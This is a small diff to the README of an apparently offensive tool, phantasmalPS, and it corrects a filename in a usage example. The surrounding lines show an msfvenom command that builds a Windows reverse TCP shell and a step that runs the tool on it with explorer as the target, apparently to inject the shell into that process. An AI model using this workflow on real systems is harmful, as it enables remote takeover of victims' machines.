@@ -22,7 +22,7 @@ msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport 8443 -f raw -o shell.
 ```
 Let phantasmalPS do its magic:
 ```bash
-python3 phantasmalPS.py -f shell -p explorer
+python3 phantasmalPS.py -f shell.bin -p explorer
 ```
 ![Run](Images/run-phantasmalPS.png)
 
